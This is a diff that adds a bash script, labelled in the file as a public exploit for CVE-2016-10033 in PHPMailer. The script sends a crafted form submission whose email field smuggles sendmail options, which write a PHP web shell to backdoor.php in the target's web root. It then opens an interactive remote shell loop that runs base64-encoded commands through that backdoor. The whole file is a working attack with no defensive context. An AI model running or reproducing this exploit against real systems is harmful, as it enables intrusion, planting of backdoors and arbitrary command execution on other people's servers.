@@ -1,0 +1,27 @@
+#!/bin/bash
+# CVE-2016-10033 exploit by opsxcq
+# https://github.com/opsxcq/exploit-CVE-2016-10033
+
+echo '[+] CVE-2016-10033 exploit by opsxcq'
+
+if [ -z "$1" ]
+then
+    echo '[-] Please inform an host as parameter'
+    exit -1
+fi
+
+host=$1
+
+echo '[+] Exploiting '$host
+
+curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\nvulnerables@ -OQueueDirectory=/tmp -X/www/backdoor.php\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n' >/dev/null && echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'
+
+cmd='whoami'
+while [ "$cmd" != 'exit' ]
+do
+    echo '[+] Running '$cmd
+    curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | head -n 1 | cut -d '|' -f 2 | base64 -d
+    echo
+    read -p 'RemoteShell> ' cmd
+done
+echo '[+] Exiting'
